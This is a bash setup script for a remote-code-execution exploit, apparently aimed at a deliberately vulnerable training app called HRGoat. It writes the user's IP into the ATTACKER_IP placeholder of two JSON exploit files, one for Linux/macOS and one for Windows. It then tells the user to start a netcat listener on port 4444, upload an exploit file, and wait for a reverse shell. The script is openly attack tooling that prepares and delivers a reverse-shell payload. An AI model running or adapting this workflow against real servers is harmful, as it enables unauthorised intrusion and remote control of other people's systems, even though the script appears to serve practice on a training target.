#!/bin/bash

# Script to prepare RCE exploit files by replacing ATTACKER_IP with the user's IP

# Check if jq is installed
if ! command -v jq &> /dev/null; then
    echo "Error: jq is required but not installed."
    echo "Please install jq first:"
    echo "  - On Ubuntu/Debian: sudo apt-get install jq"
    echo "  - On macOS: brew install jq"
    echo "  - On Windows with Chocolatey: choco install jq"
    exit 1
fi

# Get the user's IP address
echo "Detecting your IP address..."
IP=$(hostname -I | awk '{print $1}')

if [ -z "$IP" ]; then
    echo "Could not automatically detect your IP address."
    echo "Please enter your IP address (the one the target server can reach):"
    read -r IP
fi

echo "Using IP address: $IP"
echo "This IP will be used in the exploit files."
echo "Make sure this IP is reachable from the target server."
echo ""

# Replace ATTACKER_IP in the Linux/macOS exploit file
if [ -f "rce_exploit.json" ]; then
    echo "Updating rce_exploit.json..."
    sed -i.bak "s/ATTACKER_IP/$IP/g" rce_exploit.json
    echo "✓ Updated rce_exploit.json"
else
    echo "× rce_exploit.json not found"
fi

# Replace ATTACKER_IP in the Windows exploit file
if [ -f "rce_exploit_windows.json" ]; then
    echo "Updating rce_exploit_windows.json..."
    sed -i.bak "s/ATTACKER_IP/$IP/g" rce_exploit_windows.json
    echo "✓ Updated rce_exploit_windows.json"
else
    echo "× rce_exploit_windows.json not found"
fi

echo ""
echo "Setup complete! Your exploit files have been updated with your IP: $IP"
echo ""
echo "Next steps:"
echo "1. Start a listener: nc -lvnp 4444"
echo "2. Upload one of the exploit files to the HRGoat application"
echo "3. Wait for the connection on your listener"
echo ""
echo "Note: Backup files with .bak extension have been created." 